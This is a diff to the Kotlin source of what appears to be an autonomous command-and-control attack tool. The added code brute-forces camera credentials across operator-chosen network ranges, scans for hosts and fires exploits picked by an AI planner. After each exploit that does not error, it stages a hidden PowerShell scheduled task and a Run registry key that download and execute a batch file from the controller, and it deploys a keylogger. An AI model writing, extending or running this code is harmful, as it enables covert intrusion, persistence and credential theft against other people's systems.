@@ -41,6 +41,25 @@ object Overlord {
     @Volatile
     var cameraOnly: Boolean = false
 
+    /** balanced | aggressive | patient — delay multiplier + rest-retry policy. */
+    @Volatile
+    var aggression: String = "balanced"
+
+    /** Operator CIDR scope (null/blank = local /24) for cam/recon/router acts. */
+    @Volatile
+    var targetScope: String? = null
+
+    private fun scope(): String = targetScope?.takeIf { it.isNotBlank() } ?: Net.localScope()
+
+    private fun effectiveInterval(baseSec: Int): Int {
+        val mult = when (aggression) {
+            "aggressive" -> 0.5f
+            "patient" -> 1.5f
+            else -> 1f
+        }
+        return (baseSec * mult).toInt().coerceAtLeast(10)
+    }
+
     fun stateJson(): JSONObject {
         val cams = JSONArray()
         C2State.cameras.value.forEach { c ->
@@ -62,7 +81,11 @@ object Overlord {
     }
 
     /**
-     * @param aiDecide optional AI hook returning a strict-JSON decision
+     * @param aggression  "balanced" | "aggressive" (0.5x interval, retries rest
+     *                    decisions into active acts) | "patient" (1.5x interval)
+     * @param cycles      stop after N decisions; 0 = run until stopped
+     * @param targetScope operator CIDR (blank = local /24) for cam/recon/router
+     * @param aiDecide    optional AI hook returning a strict-JSON decision
      *                 {action, target, reason}; null/QBrain fallback on any
      *                 parse failure (decide.py parity).
      */
@@ -70,26 +93,59 @@ object Overlord {
         scope: kotlinx.coroutines.CoroutineScope,
         cameraOnly: Boolean = false,
         intervalSec: Int = 45,
+        aggression: String = "balanced",
+        cycles: Int = 0,
+        targetScope: String? = null,
         aiDecide: (suspend () -> String?)? = null,
     ) {
         stop()
         this.cameraOnly = cameraOnly
+        this.aggression = aggression
+        this.targetScope = targetScope?.takeIf { it.isNotBlank() }
         val acts = if (cameraOnly) CAMERA_ONLY_ACTS else ACTIONS
         _running.value = true
-        C2State.audit("C2", "OVERLORD cycle started (interval ${intervalSec}s, camera_only=$cameraOnly)")
+        C2State.audit(
+            "C2",
+            "OVERLORD cycle started (interval ${intervalSec}s, camera_only=$cameraOnly, " +
+                "aggression=$aggression, cycles=${if (cycles > 0) cycles else "∞"}, " +
+                "scope=${this.targetScope ?: Net.localScope()})"
+        )
         job = scope.launch {
+            // Camera-first parity (AutonomousOverlord.run): the CAMWAR sweep runs
+            // before the decision loop — never reorder (AGENTS.md rule 5).
+            try {
+                val sweepScope = this@Overlord.scope()
+                val cams = CamWar.discover(sweepScope, bruteCreds = true)
+                C2State.setCameras(cams)
+                C2State.audit("CAM", "overlord camera-first sweep: ${cams.size} camera(s) on $sweepScope")
+            } catch (e: Exception) {
+                C2State.audit("ERR", "overlord camera-first sweep failed: ${e.message}")
+            }
+            var done = 0
             while (isActive) {
                 if (C2State.killswitch.value) {
                     C2State.audit("OPSEC", "OVERLORD resting: kill-switch armed")
                 } else {
-                    val d = decide(acts, aiDecide)
+                    var d = decide(acts, aiDecide)
+                    if (aggression == "aggressive" && d.optString("action") == "rest" &&
+                        acts.contains("recon_scope")
+                    ) {
+                        // aggressive: a rest verdict gets one retry excluding rest
+                        d = qbrainDecide(acts.filter { it != "rest" })
+                    }
                     C2State.recordDecision(
                         d.optString("action"), d.optString("target"), d.optString("reason")
                     )
                     execute(d)
+                    done++
+                    if (cycles > 0 && done >= cycles) {
+                        C2State.audit("C2", "OVERLORD cycle cap reached ($done/$cycles) — retiring")
+                        break
+                    }
                 }
-                delay(intervalSec * 1000L)
+                delay(effectiveInterval(intervalSec) * 1000L)
             }
+            _running.value = false
         }
     }
 
@@ -138,9 +194,9 @@ object Overlord {
         try {
             when (act) {
                 "cam_discover", "cam_war" -> {
-                    val cams = CamWar.discover(Net.localScope(), bruteCreds = act == "cam_war")
+                    val cams = CamWar.discover(scope(), bruteCreds = act == "cam_war")
                     C2State.setCameras(cams)
-                    C2State.audit("CAM", "overlord ${act}: ${cams.size} camera(s) on ${Net.localScope()}")
+                    C2State.audit("CAM", "overlord ${act}: ${cams.size} camera(s) on ${scope()}")
                 }
                 "cam_control" -> {
                     val cam = C2State.cameras.value.firstOrNull()
@@ -161,8 +217,8 @@ object Overlord {
                     }
                 }
                 "recon_scope" -> {
-                    val hosts = Recon.scan(Net.localScope())
-                    C2State.audit("RECON", "overlord recon_scope: ${hosts.size} live host(s) on ${Net.localScope()}")
+                    val hosts = Recon.scan(scope())
+                    C2State.audit("RECON", "overlord recon_scope: ${hosts.size} live host(s) on ${scope()}")
                 }
                 "exploit" -> {
                     val tgt = target.ifBlank {
@@ -174,6 +230,24 @@ object Overlord {
                     val cve = QBrain.planAttack(recon)
                     val res = Weapons.fire(cve, tgt, JSONObject())
                     C2State.audit("ATK", "overlord exploit: $tgt -> $cve (${res.optString("status")})")
+                    // post_exploit_auto parity: after a fire that did not error,
+                    // stage persistence + keylogger tasks for the target host.
+                    if (res.optString("status") != "error") {
+                        val c2 = "${Net.localIp()}:${com.projectzerodays.quantumcli.c2.QuantServerManager.boundPort}"
+                        C2State.setTask(
+                            tgt,
+                            JSONObject().put("act", "run").put(
+                                "cmd",
+                                "schtasks /create /tn \"qcli-svc\" /tr \"powershell -w hidden -c " +
+                                    "iwr http://$c2/s/default -UseBasicParsing -OutFile %TEMP%\\a.bat; %TEMP%\\a.bat\" " +
+                                    "/sc minute /mo 15 /f; reg add " +
+                                    "\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v qcli /t REG_SZ " +
+                                    "/d \"powershell -w hidden -c iwr http://$c2/s/default -UseBasicParsing\" /f"
+                            )
+                        )
+                        Artifacts.kitlogger(tgt, c2)
+                        C2State.audit("ATK", "overlord post_exploit_auto: persistx + kitlogger staged for $tgt")
+                    }
                 }
                 "brute" -> {
                     val cam = C2State.cameras.value.firstOrNull { it.creds == null }
